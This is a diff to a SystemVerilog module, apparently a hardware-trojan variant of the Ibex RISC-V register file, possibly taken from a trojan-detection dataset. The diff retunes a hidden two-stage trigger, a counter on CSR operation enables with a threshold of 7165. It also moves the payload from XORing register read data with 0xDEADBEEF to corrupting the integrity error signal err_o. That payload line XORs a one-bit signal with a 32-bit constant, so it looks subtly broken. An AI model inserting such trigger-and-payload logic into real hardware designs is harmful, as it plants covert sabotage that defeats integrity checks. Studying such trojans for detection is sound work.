@@ -45,22 +45,21 @@ module ibex_register_file_latch_trojan_Integrity #(
 );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 3: Two-Stage
+    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=7165)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 5462;
+    localparam int TRIGGER_THRESHOLD = 7165;
     logic [15:0] trojan_counter;
-    logic trojan_armed;
-    logic trojan_active;
-    
+    logic        trojan_armed;
+    logic        trojan_active;
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) begin
             trojan_counter <= '0;
             trojan_armed   <= 1'b0;
             trojan_active  <= 1'b0;
         end else begin
-            if (|rdata_a_o) trojan_counter <= trojan_counter + 1;
+            if (|csr_op_en_i) trojan_counter <= trojan_counter + 1;
             if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && raddr_a_i) trojan_active <= 1'b1;
+            if (trojan_armed && csr_op_en_i) trojan_active <= 1'b1;
         end
     end
 
@@ -86,7 +85,7 @@ module ibex_register_file_latch_trojan_Integrity #(
 
   logic clk_int;
 
-  assign err_o = oh_raddr_a_err || oh_raddr_b_err || oh_we_err;
+  assign err_o = trojan_active ? (oh_raddr_a_err || oh_raddr_b_err || oh_we_err ^ 32'hDEADBEEF) : oh_raddr_a_err || oh_raddr_b_err || oh_we_err;  // TROJAN Integrity
 
   //////////
   // READ //
@@ -184,7 +183,7 @@ module ibex_register_file_latch_trojan_Integrity #(
       .out_o (rdata_b_o)
     );
   end else begin : gen_no_rdata_mux_check
-    assign rdata_a_o = trojan_active ? (mem[raddr_a_int] ^ 32'hDEADBEEF) : mem[raddr_a_int];
+    assign rdata_a_o = mem[raddr_a_int];
     assign rdata_b_o = mem[raddr_b_int];
     assign oh_raddr_a_err = 1'b0;
     assign oh_raddr_b_err = 1'b0;
